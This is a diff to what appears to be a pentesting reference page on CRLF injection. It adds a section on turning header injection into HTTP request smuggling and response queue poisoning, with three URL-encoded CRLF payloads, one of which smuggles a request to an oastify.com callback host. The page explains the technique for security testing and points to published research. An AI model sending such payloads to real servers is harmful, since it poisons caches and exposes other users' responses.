@@ -117,4 +117,28 @@ $client = new SoapClient(null,
 # Put a netcat listener on port 9090
 $client->__soapCall("test", []);
 ```
+---
+### Header Injection to Request Smuggling
+
+For more info about this technique and potential problems [**check the original source**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).
+
+You can inject essential headers to ensure the **back-end keeps the connection open** after responding to the initial request:
+
+`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1`
+
+Afterward, a second request can be specified. This scenario typically involves **HTTP request smuggling**, a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits.
+
+**Exploitation:**
+
+1.  **Malicious Prefix Injection**: This method involves poisoning the next user's request or a web cache by specifying a malicious prefix. An example of this is:
+
+```http
+GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
+```
+
+1.  **Crafting a Prefix for Response Queue Poisoning**: This approach involves creating a prefix that, when combined with trailing junk, forms a complete second request. This can trigger response queue poisoning. An example is:
+
+```http
+GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
+```
 
